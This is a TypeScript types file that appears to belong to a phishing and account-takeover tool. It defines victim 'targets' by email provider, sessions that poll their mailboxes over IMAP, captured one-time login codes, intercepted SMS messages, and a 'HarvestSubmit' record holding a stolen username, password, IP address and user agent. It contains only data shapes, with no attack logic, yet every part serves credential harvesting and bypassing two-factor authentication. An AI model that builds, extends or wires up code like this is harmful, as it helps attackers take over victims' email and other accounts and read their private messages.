export enum Provider {
  GMAIL = "GMAIL",
  YAHOO = "YAHOO",
  OTHER = "OTHER",
}

export enum TargetStatus {
  ACTIVE = "ACTIVE",
  EXPIRED = "EXPIRED",
  RATE_LIMITED = "RATE_LIMITED",
  IDLE = "IDLE",
}

export enum SessionStatus {
  POLLING = "POLLING",
  ERROR = "ERROR",
  STOPPED = "STOPPED",
}

export interface Target {
  id: string;
  email: string;
  provider: Provider;
  status: TargetStatus;
  created_at: string;
  updated_at: string;
}

export interface TargetCreate {
  email: string;
  provider: Provider;
}

export interface TargetDetail extends Target {
  credential_count: number;
  session_count: number;
  otp_count: number;
}

export interface MonitoringSession {
  id: string;
  target_id: string;
  started_at: string;
  last_checked_at: string | null;
  status: SessionStatus;
  error_log: string | null;
  consecutive_failures: number;
}

export interface ReceivedOTP {
  id: string;
  target_id: string;
  session_id: string | null;
  sender: string | null;
  subject: string | null;
  body_snippet: string | null;
  extracted_code: string;
  confidence: string | null;
  received_at: string;
  is_read: boolean;
}

// ─── Live WebSocket event shapes (must match backend broadcasts) ───────────
// The backend emits three event types over /ws/live:
//   1. otp_captured    — email path (scheduler.py IMAP IDLE / polling)
//   2. new_otp         — SMS path (sms.py, channel="sms")
//   3. intercepted_sms — raw SMS log (sms.py, every SMS, OTP or not)
// Kept as a discriminated union keyed on `type` so the listener can narrow.

export interface OtpCapturedEvent {
  type: "otp_captured";
  target_email: string;
  target_id: string;
  session_id: string | null;
  extracted_code: string;
  sender: string | null;
  subject: string | null;
  confidence: string | null;
  captured_at: string;
}

export interface NewOtpEvent {
  type: "new_otp";
  target_email: string;
  target_id: string;
  otp: {
    id: string;
    code: string;
    sender: string | null;
    snippet: string | null;
    received_at: string;
    channel: string;
  };
}

export interface InterceptedSmsEvent {
  type: "intercepted_sms";
  target_id: string | null;
  target_email: string | null;
  sms: {
    id: string;
    sender: string | null;
    recipient: string | null;
    body: string;
    received_at: string;
  };
}

export type LiveEvent = OtpCapturedEvent | NewOtpEvent | InterceptedSmsEvent;

// Backward-compatible alias — anything importing OTPBroadcast still works.
export type OTPBroadcast = LiveEvent;

export interface MonitorStats {
  total_targets: number;
  active_sessions: number;
  otps_captured_24h: number;
}

export interface HarvestSubmit {
  username: string;
  password: string;
  provider: string;
  ip_address?: string | null;
  user_agent?: string | null;
}

export interface HarvestResponse {
  status: string;
  target_id: string;
  session_id: string;
  message: string;
}
